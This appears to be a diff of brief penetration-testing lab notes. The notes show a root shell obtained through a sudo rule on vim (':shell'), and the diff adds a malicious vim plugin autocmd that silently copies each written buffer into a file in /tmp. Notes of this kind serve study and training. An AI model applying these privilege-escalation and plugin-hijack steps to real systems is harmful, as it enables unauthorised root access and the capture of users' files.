@@ -25,6 +25,13 @@ sudo -l ->  (root) NOPASSWD: /usr/bin/vim /opt/important.conf
 Login as victim user -> sudo vim  /opt/important.conf  -> :shell -> id=root
 
 
+--------------------------------------------------------
+
+ /home/offsec/.vim/plugin/settings.vim -> :autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
+
+
+
+
 
 
 
